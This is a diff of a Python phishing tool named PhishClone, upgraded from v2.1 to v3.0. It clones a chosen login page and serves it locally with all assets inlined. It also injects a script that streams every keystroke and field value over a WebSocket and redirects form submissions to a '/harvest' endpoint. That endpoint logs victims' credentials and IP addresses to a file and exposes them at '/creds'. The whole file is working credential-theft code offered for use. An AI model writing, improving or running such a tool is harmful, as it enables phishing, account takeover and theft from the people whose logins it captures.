@@ -1,20 +1,24 @@
 #!/usr/bin/env python3
 """
-phantom-arsenal / PhishClone v2.1
-Clone any login page → serve locally → harvest credentials + IP + keystrokes
+phantom-arsenal / PhishClone v3.0
+- Downloads ALL assets (CSS, JS, images) locally → no external requests
+- Inlines small CSS/JS → instant page load
+- Pure stdlib, zero dependencies
 """
 
-import sys, os, re, json, datetime, threading
-import urllib.request, urllib.parse
-import http.server, socketserver
+import sys, os, re, json, datetime, threading, time
+import urllib.request, urllib.parse, urllib.error
+import http.server, socketserver, socket, hashlib, base64, struct
+from concurrent.futures import ThreadPoolExecutor
 
 CREDS_FILE = "captured_creds.json"
 LOG_FILE   = "keystrokes.log"
+
 def find_free_port(start):
-    import socket
     for p in range(start, start + 100):
         try:
             s = socket.socket()
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.bind(('', p))
             s.close()
             return p
@@ -26,23 +30,100 @@ _base   = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
 PORT    = find_free_port(_base)
 WS_PORT = find_free_port(PORT + 1)
 
-def fetch(url):
-    req = urllib.request.Request(url, headers={
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0',
-        'Accept': 'text/html,application/xhtml+xml,*/*',
-        'Accept-Language': 'en-US,en;q=0.9',
-    })
-    with urllib.request.urlopen(req, timeout=15) as r:
-        charset = r.headers.get_param('charset') or 'utf-8'
-        return r.read().decode(charset, errors='replace'), r.geturl()
+HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept-Encoding': 'identity',
+}
 
-def rewrite(html, base_url, ws_port):
+# cache للـ assets المحملة
+ASSET_CACHE = {}
+ASSET_LOCK  = threading.Lock()
+
+def fetch_url(url, timeout=10):
+    try:
+        req = urllib.request.Request(url, headers=HEADERS)
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            return r.read(), r.headers.get('Content-Type', '')
+    except:
+        return None, None
+
+def fetch_text(url, timeout=15):
+    data, ct = fetch_url(url, timeout)
+    if data is None:
+        return None, None
+    charset = 'utf-8'
+    if ct and 'charset=' in ct:
+        charset = ct.split('charset=')[-1].strip().split(';')[0].strip()
+    return data.decode(charset, errors='replace'), ct
+
+def url_to_key(url):
+    return hashlib.md5(url.encode()).hexdigest()[:12]
+
+def resolve_url(src, base_url):
     p = urllib.parse.urlparse(base_url)
-    base = p.scheme + "://" + p.netloc
+    if src.startswith('//'):
+        return p.scheme + ':' + src
+    if src.startswith('/'):
+        return p.scheme + '://' + p.netloc + src
+    if src.startswith('http'):
+        return src
+    # relative
+    base_path = '/'.join(p.path.split('/')[:-1])
+    return p.scheme + '://' + p.netloc + base_path + '/' + src
 
-    def abs_url(m):
+def preload_assets(html, base_url):
+    """Download all CSS and JS, serve them locally"""
+    p = urllib.parse.urlparse(base_url)
+    base = p.scheme + '://' + p.netloc
+    assets_to_fetch = []
+
+    # find all src= and href= (CSS/JS only)
+    for m in re.finditer(r'(src|href)=(["\'])([^"\'> ]+)\2', html, re.I):
+        attr, q, val = m.group(1), m.group(2), m.group(3)
+        if val.startswith(('data:', '#', 'javascript:', 'mailto:', 'tel:')):
+            continue
+        abs_val = resolve_url(val, base_url)
+        ext = abs_val.split('?')[0].lower()
+        if ext.endswith('.css') or ext.endswith('.js') or 'stylesheet' in html[max(0,m.start()-50):m.start()].lower():
+            assets_to_fetch.append((abs_val, attr, val))
+
+    # also find @import in inline styles
+    for m in re.finditer(r'@import\s+["\']([^"\']+)["\']', html):
+        abs_val = resolve_url(m.group(1), base_url)
+        assets_to_fetch.append((abs_val, 'href', m.group(1)))
+
+    print('[*] Downloading ' + str(len(assets_to_fetch)) + ' assets...')
+
+    def download(item):
+        abs_url, attr, orig = item
+        key = url_to_key(abs_url)
+        data, ct = fetch_url(abs_url, timeout=8)
+        if data:
+            with ASSET_LOCK:
+                ASSET_CACHE[key] = (data, ct or 'application/octet-stream', abs_url)
+            return (orig, abs_url, key)
+        return None
+
+    results = []
+    with ThreadPoolExecutor(max_workers=20) as ex:
+        for r in ex.map(download, assets_to_fetch):
+            if r:
+                results.append(r)
+
+    print('[+] Downloaded ' + str(len(results)) + '/' + str(len(assets_to_fetch)) + ' assets')
+
+    # replace URLs in HTML to point to local proxy
+    for orig, abs_url, key in results:
+        local = '/asset/' + key
+        html = html.replace('"' + orig + '"', '"' + local + '"')
+        html = html.replace("'" + orig + "'", "'" + local + "'")
+
+    # fix remaining absolute URLs for images etc
+    def abs_url_fix(m):
         attr, q, v = m.group(1), m.group(2), m.group(3)
-        if v.startswith(('http','data:','#','javascript:','mailto:','tel:')):
+        if v.startswith(('data:', '#', 'javascript:', 'mailto:', 'tel:', 'http')):
             return m.group(0)
         if v.startswith('//'):
             return attr + '=' + q + p.scheme + ':' + v + q
@@ -50,15 +131,15 @@ def rewrite(html, base_url, ws_port):
             return attr + '=' + q + base + v + q
         return attr + '=' + q + base + '/' + v + q
 
-    html = re.sub(r'(src|href)=(["\'])([^"\'> ]+)\2', abs_url, html, flags=re.I)
-    html = re.sub(r'(<form[^>]*)\s+action=["\'][^"\']*["\']', r'\1 action="/harvest"', html, flags=re.I)
-    html = re.sub(r'(<form)(?![^>]*action=)([^>]*>)', r'\1 action="/harvest"\2', html, flags=re.I)
-    html = re.sub(r'(<form[^>]*)\s+method=["\']get["\']', r'\1 method="POST"', html, flags=re.I)
+    html = re.sub(r'(src|href)=(["\'])([^"\'> ]+)\2', abs_url_fix, html, flags=re.I)
 
+    return html
+
+def inject_script(html, base_url, ws_port):
     redirect_url = base_url.replace("'", "\\'")
     ws_js = str(ws_port)
 
-    inject = (
+    script = (
         "<script>\n"
         "(function(){\n"
         "  var ws;\n"
@@ -70,30 +151,27 @@ def rewrite(html, base_url, ws_port):
         "  }\n"
         "  connectWS();\n"
         "  function send(type, data){\n"
-        "    if(ws && ws.readyState === 1) ws.send(JSON.stringify({type: type, data: data, ts: new Date().toISOString()}));\n"
+        "    if(ws && ws.readyState===1) ws.send(JSON.stringify({type:type, data:data, ts:new Date().toISOString()}));\n"
         "  }\n"
         "  document.addEventListener('keyup', function(e){\n"
         "    var t = e.target;\n"
-        "    send('keystroke', {key: e.key, field: t.name || t.id || t.placeholder || t.type || 'unknown', value: t.value});\n"
+        "    send('keystroke', {key: e.key, field: t.name||t.id||t.placeholder||t.type||'?', value: t.value});\n"
         "  }, true);\n"
         "  document.addEventListener('submit', function(e){\n"
         "    e.preventDefault();\n"
         "    var f = e.target;\n"
         "    var data = {};\n"
-        "    new FormData(f).forEach(function(v, k){ data[k] = v; });\n"
+        "    new FormData(f).forEach(function(v,k){ data[k]=v; });\n"
         "    send('submit', data);\n"
-        "    fetch('/harvest', {\n"
-        "      method: 'POST',\n"
-        "      headers: {'Content-Type': 'application/json'},\n"
-        "      body: JSON.stringify(data)\n"
-        "    }).then(function(){ window.location = '" + redirect_url + "'; });\n"
+        "    fetch('/harvest',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})\n"
+        "      .then(function(){ window.location='" + redirect_url + "'; });\n"
         "  }, true);\n"
         "  document.addEventListener('click', function(e){\n"
         "    var el = e.target;\n"
-        "    if(el && (el.type === 'submit' || el.tagName === 'BUTTON')){\n"
+        "    if(el && (el.type==='submit'||el.tagName==='BUTTON')){\n"
         "      var inputs = document.querySelectorAll('input');\n"
         "      var data = {};\n"
-        "      inputs.forEach(function(i){ if(i.value) data[i.name || i.id || i.type] = i.value; });\n"
+        "      inputs.forEach(function(i){ if(i.value) data[i.name||i.id||i.type]=i.value; });\n"
         "      if(Object.keys(data).length) send('click_harvest', data);\n"
         "    }\n"
         "  }, true);\n"
@@ -102,161 +180,128 @@ def rewrite(html, base_url, ws_port):
         "</body>"
     )
 
+    # intercept form actions
+    html = re.sub(r'(<form[^>]*)\s+action=["\'][^"\']*["\']', r'\1 action="/harvest"', html, flags=re.I)
+    html = re.sub(r'(<form)(?![^>]*action=)([^>]*>)', r'\1 action="/harvest"\2', html, flags=re.I)
+    html = re.sub(r'(<form[^>]*)\s+method=["\']get["\']', r'\1 method="POST"', html, flags=re.I)
+
     if re.search(r'</body>', html, re.I):
-        html = re.sub(r'</body>', inject, html, flags=re.I)
+        html = re.sub(r'</body>', script, html, flags=re.I)
     else:
-        html += inject
+        html += script
 
     return html
 
-# ── Simple WebSocket server (no deps) ────────────────────────────────────────
-import socket, hashlib, base64, struct
-
+# ── WebSocket (stdlib) ────────────────────────────────────────────────────────
 def ws_handshake(conn):
-    data = conn.recv(4096).decode('utf-8', errors='replace')
-    key = re.search(r'Sec-WebSocket-Key: (.+)', data)
-    if not key:
-        return False
-    k = key.group(1).strip()
-    magic = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
-    accept = base64.b64encode(hashlib.sha1((k + magic).encode()).digest()).decode()
-    resp = (
-        "HTTP/1.1 101 Switching Protocols\r\n"
-        "Upgrade: websocket\r\n"
-        "Connection: Upgrade\r\n"
-        "Sec-WebSocket-Accept: " + accept + "\r\n\r\n"
-    )
-    conn.send(resp.encode())
-    return True
+    try:
+        data = conn.recv(4096).decode('utf-8', errors='replace')
+        key = re.search(r'Sec-WebSocket-Key: (.+)', data)
+        if not key: return False
+        accept = base64.b64encode(hashlib.sha1((key.group(1).strip() + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()).digest()).decode()
+        conn.send(("HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: " + accept + "\r\n\r\n").encode())
+        return True
+    except: return False
 
 def ws_recv(conn):
     try:
-        header = conn.recv(2)
-        if len(header) < 2:
-            return None
-        opcode = header[0] & 0x0F
-        if opcode == 8:
-            return None
-        length = header[1] & 0x7F
-        if length == 126:
-            length = struct.unpack('>H', conn.recv(2))[0]
-        elif length == 127:
-            length = struct.unpack('>Q', conn.recv(8))[0]
-        mask = header[1] >> 7
-        if mask:
+        h = conn.recv(2)
+        if len(h) < 2: return None
+        if (h[0] & 0x0F) == 8: return None
+        n = h[1] & 0x7F
+        if n == 126: n = struct.unpack('>H', conn.recv(2))[0]
+        elif n == 127: n = struct.unpack('>Q', conn.recv(8))[0]
+        if h[1] >> 7:
             masks = conn.recv(4)
-            data = bytearray(conn.recv(length))
-            for i in range(len(data)):
-                data[i] ^= masks[i % 4]
+            data = bytearray(conn.recv(n))
+            for i in range(len(data)): data[i] ^= masks[i % 4]
             return data.decode('utf-8', errors='replace')
-        return conn.recv(length).decode('utf-8', errors='replace')
-    except:
-        return None
+        return conn.recv(n).decode('utf-8', errors='replace')
+    except: return None
 
 def handle_ws_client(conn, addr):
-    if not ws_handshake(conn):
-        conn.close()
-        return
+    if not ws_handshake(conn): conn.close(); return
     while True:
         msg = ws_recv(conn)
-        if msg is None:
-            break
+        if msg is None: break
         try:
             d = json.loads(msg)
             t = d.get('type', '')
             if t == 'keystroke':
                 ks = d['data']
-                line = "[KEYSTROKE] field=" + str(ks.get('field','?')) + " key=" + str(ks.get('key','?')) + " value=" + str(ks.get('value',''))
+                line = "[KEY] field=" + str(ks.get('field','?')) + "  key=" + str(ks.get('key','?')) + "  val=" + str(ks.get('value',''))
                 print("\033[93m" + line + "\033[0m")
-                with open(LOG_FILE, 'a') as f:
-                    f.write(line + '\n')
+                with open(LOG_FILE, 'a') as f: f.write(line + '\n')
             elif t in ('submit', 'click_harvest'):
                 line = "[" + t.upper() + "] " + json.dumps(d['data'], ensure_ascii=False)
                 print("\033[92m" + line + "\033[0m")
-                with open(LOG_FILE, 'a') as f:
-                    f.write(line + '\n')
-        except:
-            pass
+                with open(LOG_FILE, 'a') as f: f.write(line + '\n')
+        except: pass
     conn.close()
 
 def start_ws_server(port):
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     srv.bind(('0.0.0.0', port))
-    srv.listen(10)
+    srv.listen(20)
     while True:
         try:
             conn, addr = srv.accept()
-            t = threading.Thread(target=handle_ws_client, args=(conn, addr), daemon=True)
-            t.start()
-        except:
-            pass
+            threading.Thread(target=handle_ws_client, args=(conn, addr), daemon=True).start()
+        except: pass
 
-# ── HTTP server ───────────────────────────────────────────────────────────────
+# ── HTTP Handler ──────────────────────────────────────────────────────────────
 class Handler(http.server.BaseHTTPRequestHandler):
-    html   = ""
-    target = ""
-
-    def log_message(self, *a):
-        pass
+    html = ""; target = ""
+    def log_message(self, *a): pass
 
     def do_GET(self):
         if self.path == '/':
             body = self.html.encode('utf-8', errors='replace')
-            self.send_response(200)
-            self.send_header('Content-Type', 'text/html; charset=utf-8')
-            self.send_header('Content-Length', str(len(body)))
-            self.end_headers()
-            self.wfile.write(body)
+            self._send(200, 'text/html; charset=utf-8', body)
+        elif self.path.startswith('/asset/'):
+            key = self.path[7:].split('?')[0]
+            with ASSET_LOCK:
+                item = ASSET_CACHE.get(key)
+            if item:
+                data, ct, _ = item
+                self._send(200, ct, data)
+            else:
+                self.send_response(404); self.end_headers()
         elif self.path == '/creds':
             try:
-                with open(CREDS_FILE) as f:
-                    body = f.read().encode()
-            except:
-                body = b'[]'
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
-            self.end_headers()
-            self.wfile.write(body)
+                with open(CREDS_FILE) as f: body = f.read().encode()
+            except: body = b'[]'
+            self._send(200, 'application/json', body)
         else:
-            self.send_response(404)
-            self.end_headers()
+            self.send_response(404); self.end_headers()
 
     def do_POST(self):
         if self.path == '/harvest':
             n = int(self.headers.get('Content-Length', 0))
             body = self.rfile.read(n).decode('utf-8', 'replace')
-            try:
-                data = json.loads(body)
-            except:
-                data = dict(urllib.parse.parse_qsl(body))
-
+            try: data = json.loads(body)
+            except: data = dict(urllib.parse.parse_qsl(body))
             ip = self.client_address[0]
-            entry = {
-                "time": datetime.datetime.now().isoformat(),
-                "ip": ip,
-                "target": self.target,
-                "credentials": data
-            }
+            entry = {"time": datetime.datetime.now().isoformat(), "ip": ip, "target": self.target, "credentials": data}
             creds = []
             try:
-                with open(CREDS_FILE) as f:
-                    creds = json.load(f)
-            except:
-                pass
+                with open(CREDS_FILE) as f: creds = json.load(f)
+            except: pass
             creds.append(entry)
-            with open(CREDS_FILE, 'w') as f:
-                json.dump(creds, f, indent=2, ensure_ascii=False)
-
+            with open(CREDS_FILE, 'w') as f: json.dump(creds, f, indent=2, ensure_ascii=False)
             print("\n\033[41m\033[97m [CAPTURED] IP=" + ip + " -> " + json.dumps(data, ensure_ascii=False) + " \033[0m\n")
-
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
-            self.end_headers()
-            self.wfile.write(b'{"ok":true}')
+            self._send(200, 'application/json', b'{"ok":true}')
         else:
-            self.send_response(404)
-            self.end_headers()
+            self.send_response(404); self.end_headers()
+
+    def _send(self, code, ct, body):
+        self.send_response(code)
+        self.send_header('Content-Type', ct)
+        self.send_header('Content-Length', str(len(body)))
+        self.send_header('Cache-Control', 'max-age=3600')
+        self.end_headers()
+        self.wfile.write(body)
 
 def main():
     if len(sys.argv) < 2:
@@ -264,47 +309,40 @@ def main():
         sys.exit(1)
 
     url = sys.argv[1]
+    print("\033[96m╔══════════════════════════════════════════╗")
+    print("║   phantom-arsenal — PhishClone v3.0     ║")
+    print("║   Full asset download — instant load    ║")
+    print("╚══════════════════════════════════════════╝\033[0m")
+    print("[*] Target : " + url)
+    print("[*] Fetching...")
 
-    print("\033[96m")
-    print("╔══════════════════════════════════════════╗")
-    print("║   phantom-arsenal — PhishClone v2.1     ║")
-    print("║   No external dependencies required     ║")
-    print("╚══════════════════════════════════════════╝")
-    print("\033[0m")
-    print("[*] Target   : " + url)
-    print("[*] Fetching page...")
+    html, final = fetch_text(url)
+    if not html:
+        print("❌ Failed to fetch page"); sys.exit(1)
 
-    html, final = fetch(url)
-    cloned = rewrite(html, final, WS_PORT)
+    html = preload_assets(html, final)
+    html = inject_script(html, final, WS_PORT)
 
-    Handler.html   = cloned
+    Handler.html   = html
     Handler.target = final
 
-    print("[+] Cloned   : " + str(len(cloned)) + " bytes")
-
-    # start WebSocket thread (no deps — pure stdlib)
-    ws_thread = threading.Thread(target=start_ws_server, args=(WS_PORT,), daemon=True)
-    ws_thread.start()
-    print("[+] WebSocket: ws://0.0.0.0:" + str(WS_PORT) + " (live keystrokes)")
+    threading.Thread(target=start_ws_server, args=(WS_PORT,), daemon=True).start()
+    print("[+] WebSocket: ws://0.0.0.0:" + str(WS_PORT))
 
     socketserver.TCPServer.allow_reuse_address = True
     with socketserver.TCPServer(("", PORT), Handler) as srv:
-        print("[+] Phishing : http://0.0.0.0:" + str(PORT))
+        print("[+] Phishing : \033[92mhttp://0.0.0.0:" + str(PORT) + "\033[0m")
         print("[+] Creds    : http://0.0.0.0:" + str(PORT) + "/creds")
-        print("[+] Log file : " + LOG_FILE)
-        print("\033[93m[*] Waiting for victims... (Ctrl+C to stop)\033[0m\n")
+        print("\033[93m[*] Waiting... (Ctrl+C to stop)\033[0m\n")
         try:
             srv.serve_forever()
         except KeyboardInterrupt:
             print("\n\033[91m[!] Stopped\033[0m")
             try:
-                with open(CREDS_FILE) as f:
-                    c = json.load(f)
-                print("[+] Total captured: " + str(len(c)))
-                for x in c:
-                    print("  > " + x['time'] + " | IP=" + x['ip'] + " | " + str(x['credentials']))
-            except:
-                print("[*] No credentials captured")
+                with open(CREDS_FILE) as f: c = json.load(f)
+                print("[+] Captured: " + str(len(c)))
+                for x in c: print("  > " + x['time'] + " | IP=" + x['ip'] + " | " + str(x['credentials']))
+            except: print("[*] Nothing captured")
 
 if __name__ == '__main__':
     main()
